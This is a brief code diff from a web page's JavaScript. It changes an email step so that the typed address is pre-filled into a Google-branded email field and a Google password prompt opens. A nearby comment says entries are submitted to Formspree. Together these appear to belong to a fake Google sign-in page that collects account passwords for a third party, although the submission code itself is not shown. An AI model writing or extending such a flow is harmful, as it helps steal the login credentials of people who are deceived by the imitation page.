@@ -40,7 +40,9 @@ function openEmailPassword() {
     alert('Please enter your email address.');
     return;
   }
-  window.location.href = 'chat.html';
+  // Pre-fill the Google email input with what they typed
+  document.getElementById('google-email-input').value = email;
+  openGooglePassword();
 }
 
 // Submit to Formspree then redirect
